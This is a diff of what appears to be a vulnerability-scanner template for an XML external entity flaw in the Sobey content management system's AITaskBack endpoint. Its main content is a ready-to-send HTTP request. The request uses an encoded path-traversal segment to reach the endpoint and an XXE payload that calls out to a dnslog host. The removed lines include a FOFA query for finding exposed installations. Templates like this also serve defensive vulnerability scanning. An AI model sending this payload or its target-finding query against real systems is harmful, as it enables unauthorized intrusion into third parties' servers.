@@ -3,12 +3,8 @@ info:
   name: 索贝内容管理系统AITaskBack存在xml注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lnnzblf1u91swyqc'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lnnzblf1u91swyqc
-    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
 http:
 - raw:
   - "POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://xxe.2qa24o.dnslog.cn/xxe_test\">\n]>\n<root>\n  <TextResult>&xxe;</TextResult>\n</root>"
